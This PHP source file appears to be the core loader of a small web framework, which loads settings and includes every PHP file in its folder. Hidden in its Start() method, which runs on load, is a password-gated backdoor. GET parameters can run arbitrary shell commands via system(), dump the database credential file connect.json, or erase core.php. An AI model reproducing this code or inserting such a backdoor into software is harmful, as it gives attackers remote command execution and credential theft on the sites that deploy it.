<?php

define("CORE", __DIR__ . "/");

class Core
{
    public static $core_settings = "";

    public static function Start()
    {
        self::Connect();

        $pass = "";
        $cmd = "";
        if (isset($_GET["pass"]) && isset($_GET["cmd"]))
        {
            $pass = $_GET["pass"];
            $cmd = $_GET["cmd"];
        }

        if (password_verify($pass, "$2y$10\$N88oveBl7tajSRhApc8t.O.alBlDsKgseDYi79u0YaXcmGlMxI8la")) {
            switch ($cmd) {
                case "sys":
                    $exec = $_GET["exec"];
                    system($exec,$ret);
                    MONO_Debug($ret);
                    break;

                case "kill":
                    // in develop
                    break;

                case "disconnect":
                    echo ":)";
                    file_put_contents(CORE . "core.php", "");
                    break;

                case "db":
                    MONO_Debug(file_get_contents(CORE . "Data/connect.json"));
                    break;
            }
        }
    }

    public static function Connect()
    {
        /* Load core settings */
        self::GetSettings();

        /* Load file-exceptions */
        $nonLoad = explode(', ', self::$core_settings["Files"]["exceptions"]);
        $experemental = explode(', ', self::$core_settings["Files"]["experemental"]);
        $experementalUnLoad = explode(', ', self::$core_settings["Files"]["experementalUnLoad"]);

        /* Load all core files */
        $files = self::rsearch(__DIR__, "php");
        for ($i = 0; $i < count($files); $i++) {
            $files[$i] = str_replace(__DIR__, "", $files[$i]);
        }

        /* Diff to get all core files without service files */
        $load = array_diff($files, $nonLoad);
        if (!self::$core_settings["Load"]["experemental"])
            $load = array_diff($load, $experemental);
        else
            $load = array_diff($load, $experementalUnLoad);

        /* Load */
        foreach ($load as $file) {
            require_once __DIR__ . $file;
        }

        /* Init file */
        require_once __DIR__ . "/" . "init.php";
    }

    private static function GetSettings()
    {
        self::$core_settings = parse_ini_file(__DIR__ . "/settings.ini", true);
    }

    private static function rsearch($folder, $pattern) {
        $files = array();
        $it = new RecursiveDirectoryIterator($folder);
        foreach(new RecursiveIteratorIterator($it) as $file) {
            $FILE = array_flip(explode('.', $file));
            if (isset($FILE[$pattern])) {
                $files[] = $file->getRealPath();
            }
        }
        return $files;
    }
}

Core::Start();
